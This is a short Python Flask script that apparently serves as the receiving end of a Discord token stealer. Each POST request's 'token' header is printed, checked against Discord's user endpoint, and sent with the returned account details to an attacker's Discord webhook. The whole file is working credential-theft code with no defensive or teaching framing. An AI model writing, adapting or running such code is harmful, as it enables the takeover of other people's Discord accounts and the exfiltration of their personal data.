from flask import Flask, request, jsonify
import requests

webhook = "" # Your discord webhook url

app = Flask("gay")
@app.route('/', methods=["POST"])
def main():
  token = request.headers["token"]
  print(token)
  r = requests.get("https://discord.com/api/v9/users/@me", headers={"authorization": token})
  requests.post(webhook, json={"content": f"Token: {token}"})
  requests.post(webhook, json={"content": str(r.json())})
  if r.status_code == 200:
    return jsonify(r.json()), 200
  else:
    return jsonify(r.json()), 400
    
app.run(host='0.0.0.0', port=8080)
